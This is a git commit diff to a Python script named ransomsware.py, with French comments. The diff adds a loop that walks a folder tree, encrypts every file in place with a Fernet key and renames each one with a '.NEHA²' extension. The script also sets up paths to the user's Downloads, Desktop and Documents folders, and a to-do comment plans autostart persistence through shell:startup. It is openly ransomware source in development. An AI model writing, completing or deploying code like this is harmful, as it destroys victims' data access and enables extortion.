9dbbedf8399d6dac61daba236700867d53fd635a
LopoDistrict <137716968+LopoDistrict@users.noreply.github.com>
2023-10-10 21:14:41 +0200

    Update ransomsware.py

--- ransomsware.py
+++ ransomsware.py
@@ -3,6 +3,16 @@ from pathlib import Path
 from cryptography.fernet import Fernet
 
 
+#A FAIRE
+#mettre un checker qui check
+#auto exec dans le path shell:startup
+
+
+
+"""
+RANSOMSWARExd
+
+"""
 download  = os.path.normpath(r"%s\Downloads"%(os.environ['USERPROFILE']))
 desktop = os.path.normpath(r"%s\Desktop"%(os.environ['USERPROFILE']))
 documents = os.path.normpath(r"%s\Documents"%(os.environ['USERPROFILE']))
@@ -19,22 +29,57 @@ with open("key.key", "wb") as key_file:
     key_file.write(key)
 
 f_key = Fernet(key)
+   
 
 
-for filename in os.listdir(image_one_drive):
-    f = os.path.join(image_one_drive, filename)
-    print(f)
-         
+
+# assign directory
+#ATTENTION ENCRYPT TOUT LES FICHIERS
+
+directory = r'C:\Users\LordN\OneDrive\Bureau\code\word_list_generator\pswd\test'
+
+# iterate over files in
+# that directory
+
+#itere parcourt et encrypt tout les fichier d'un arbre a dossier
+
+for root, dirs, files in os.walk(directory):
+	for filename in files:
+            if os.path.isdir(os.path.join(root, filename)):  
+                print("\nIt is a directory")
+                print(os.path.join(root, filename))
+
+            elif os.path.isfile(os.path.join(root, filename)):  
+                print("\nIt is a normal file") 
+                print(os.path.join(root, filename))  
+                #encrypt file
+                with open(f"{os.path.join(root, filename)}", "rb") as file:
+                    # read all file data
+                    file_data = file.read()
+                    encrypted_data = f_key.encrypt(file_data)
+                    
+                with open(f"{os.path.join(root, filename)}", "wb") as file:
+                    file.write(encrypted_data) 
+                #ENCRYPT SUFFIX
+                p = Path(f"{os.path.join(root, filename)}")
+                p.rename(p.with_suffix('.NEHA²'))
+            
+
+        
+    
 
 
+
+#encrypt file
 with open("test/text-test.txt", "rb") as file:
-        # read all file data
-        file_data = file.read()
-        encrypted_data = f_key.encrypt(file_data)
-        with open("test/text-test.txt", "wb") as file:
-            file.write(encrypted_data)
+    # read all file data
+    file_data = file.read()
+    encrypted_data = f_key.encrypt(file_data)
+    with open("test/text-test.txt", "wb") as file:
+        file.write(encrypted_data)
 
 
-#ENCRYPT SUFFIX
-p = Path('test/steve.nash')
-p.rename(p.with_suffix('.NEHAx²'))
+
+
+
+
